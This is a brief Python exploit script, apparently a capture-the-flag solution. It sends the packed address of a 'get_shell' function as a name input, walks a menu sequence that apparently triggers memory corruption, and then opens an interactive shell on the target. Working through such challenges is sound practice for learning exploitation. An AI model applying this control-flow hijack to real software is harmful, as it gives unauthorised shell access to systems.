import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

print(p.readuntil("name?"))
get_shell = p64(0x400d3e)
p.sendline(get_shell)
print(p.readuntil("back"))
p.sendline("1")
print(p.readuntil("throw?"))
p.sendline("5")
print(p.readuntil("back"))
p.sendline("2")
print(p.readuntil("fetch?"))
p.sendline("8")
print(p.readuntil("back"))
p.sendline("3")
print(p.readuntil("options?"))
p.sendline("y")
print(p.readuntil("back"))
p.sendline("2")
print(p.readuntil("fetch?"))
p.sendline("9")
print(p.readuntil("back"))
p.sendline("5")
print(p.readuntil("back"))
p.sendline("4")

p.interactive()
